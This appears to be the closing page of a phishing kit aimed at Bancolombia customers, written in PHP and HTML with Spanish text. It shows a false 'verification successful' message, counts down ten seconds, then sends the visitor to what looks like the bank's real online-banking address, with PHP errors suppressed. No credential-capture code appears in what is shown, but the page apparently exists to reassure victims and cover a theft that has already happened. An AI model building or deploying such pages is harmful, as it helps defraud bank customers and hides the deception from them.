<?php 
error_reporting(0);
?>  
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">

    <script src="https://cdn.tailwindcss.com"></script>

</head>
<body>
    <div style="height: 100vh; width: 100vw;" class="flex justify-center items-center flex-col gap-5">
        <img class="h-[30px]" src="./assets/logo.svg" alt="">
        
        <p class="text-black bg-green-300 p-3 rounded">¡Verificacion exitosa! Espera <strong id="time"><label id="countdown">10</label> segundos.</strong></p>
    </div>

    <script>
        var url="https://sucursalpersonas.transaccionesbancolombia.com/";
        var seconds = 10; //número de segundos a contar
        function secondPassed() {
            var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
            var remainingSeconds = seconds % 60; //calcula los segundos
            //si los segundos usan sólo un dígito, añadimos un cero a la izq
            if (remainingSeconds < 10) { 
            remainingSeconds = "0" + remainingSeconds; 
            } 
            document.getElementById('countdown').innerHTML = seconds; 
            if (seconds == 0) { 
            clearInterval(countdownTimer); 
            window.location=url;
            } else { 
            seconds--; 
            } 
        } 
        var countdownTimer = setInterval(secondPassed, 1000);
    </script>
</body>
</html>